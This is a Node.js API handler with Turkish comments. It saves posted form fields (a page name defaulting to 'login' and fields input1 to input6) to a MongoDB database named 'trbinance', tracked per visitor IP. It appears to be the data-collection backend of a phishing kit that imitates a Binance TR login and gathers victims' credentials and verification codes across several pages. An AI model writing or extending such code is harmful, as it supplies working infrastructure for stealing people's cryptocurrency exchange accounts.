const clientPromise = require('../lib/mongo');

async function readBody(req) {
  const chunks = [];
  return new Promise((resolve, reject) => {
    req.on('data', chunk => chunks.push(chunk));
    req.on('end', () => {
      try {
        const raw = Buffer.concat(chunks).toString() || '{}';
        resolve(JSON.parse(raw));
      } catch (err) {
        reject(err);
      }
    });
    req.on('error', reject);
  });
}

function getClientIp(req) {
  const header = req.headers['x-forwarded-for'] || req.headers['X-Forwarded-For'];
  if (header) {
    return header.split(',')[0].trim();
  }
  return (req.socket && req.socket.remoteAddress) || 'unknown';
}

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const body = await readBody(req);
    const {
      page = 'login',
      inputs = {}
    } = body || {};

    const ip = getClientIp(req);
    const now = new Date();

    const setFields = {
      updatedAt: now,
      ip
    };

    if (page && String(page).trim()) {
      setFields.page = String(page).slice(0, 120);
    }

    // Sadece gönderilen ve boş olmayan input alanlarını güncelle
    // Boş string gönderilirse veya hiç gönderilmezse MongoDB'deki değeri koru
    // Örnek: Eğer sadece input1 gönderildiyse, sadece input1'i güncelle, input2-6'yı koru
    if (inputs && typeof inputs === 'object') {
      for (let i = 1; i <= 6; i += 1) {
        const key = `input${i}`;
        // Sadece inputs objesinde key varsa kontrol et
        if (Object.prototype.hasOwnProperty.call(inputs, key)) {
          const value = inputs[key];
          // Sadece değer varsa, null değilse ve boş string değilse güncelle
          if (value !== undefined && value !== null && String(value).trim() !== '') {
            setFields[key] = String(value).trim().slice(0, 512);
          }
          // Eğer key yoksa veya boş string ise, MongoDB'deki değeri koru (güncelleme yapma)
        }
      }
    }

    const client = await clientPromise;
    const db = client.db(process.env.MONGODB_DB || 'trbinance');
    const logs = db.collection('formLogs');

    // Mevcut kaydı kontrol et
    const existingLog = await logs.findOne({ ip });

    const setOnInsertFields = {
      createdAt: now
    };

    // Eğer page gönderilmediyse, sadece yeni kayıt oluşturulurken ekle
    if (!page) {
      setOnInsertFields.page = 'unknown';
    }

    // Yeni kayıt oluşturuluyorsa logNumber ekle
    if (!existingLog) {
      const totalLogs = await logs.countDocuments();
      setOnInsertFields.logNumber = totalLogs + 1;
    }

    const result = await logs.updateOne(
      { ip },
      {
        $set: setFields,
        $setOnInsert: setOnInsertFields
      },
      { upsert: true }
    );

    // MongoDB'ye kaydın başarıyla yapıldığından emin ol
    if (result.acknowledged !== true) {
      console.error('MongoDB update not acknowledged', result);
      return res.status(500).json({ error: 'Database write failed' });
    }

    return res.status(201).json({ ok: true });
  } catch (err) {
    console.error('Form log error', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
};


